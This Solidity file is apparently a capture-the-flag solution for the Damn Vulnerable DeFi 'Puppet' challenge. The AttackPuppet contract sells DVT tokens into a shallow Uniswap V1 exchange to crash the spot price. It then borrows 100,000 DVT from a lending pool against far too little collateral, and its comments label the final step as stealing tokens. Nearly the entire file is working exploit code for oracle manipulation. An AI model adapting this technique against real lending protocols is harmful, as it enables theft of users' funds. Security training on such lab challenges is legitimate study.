// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapExchangeV1 {
    function WETH() external pure returns (address);

    function tokenToEthTransferInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline,
        address recipient
    ) external returns (uint256);
}

interface IPool {
    function borrow(uint256 amount, address recipient) external payable;
}


contract AttackPuppet {

    IERC20 token;
    IUniswapExchangeV1 immutable exchange;
    IPool immutable pool;
    address immutable player;

    uint256 constant SEND_DVT_AMOUNT = 1_000 ether;
    uint256 constant DEPOSIT_FACTOR = 2;
    uint256 constant BORROW_DVT_AMOUNT = 100_000 ether;

    constructor(address _token, address _pair, address _pool, address _attacker) {
        token = IERC20(_token);
        exchange = IUniswapExchangeV1(_pair);
        pool = IPool(_pool);
        player = _attacker;
    }

    function attack() external payable {
        // require(msg.sender == player);

        // 1. Send DVT tokens to pool
        token.approve(address(exchange), SEND_DVT_AMOUNT);
        exchange.tokenToEthTransferInput(SEND_DVT_AMOUNT, 9 ether, block.timestamp + 1 days, address(this));

        // 2. Calculate amount
        uint256 price = address(exchange).balance * (10 ** 18) / token.balanceOf(address(exchange));

        uint256 depositRequired = BORROW_DVT_AMOUNT * price * DEPOSIT_FACTOR / 10 ** 18;

        // 3. Borrow and steal DVT
        pool.borrow{value: depositRequired}(BORROW_DVT_AMOUNT, player);
    }

    receive() external payable {}
}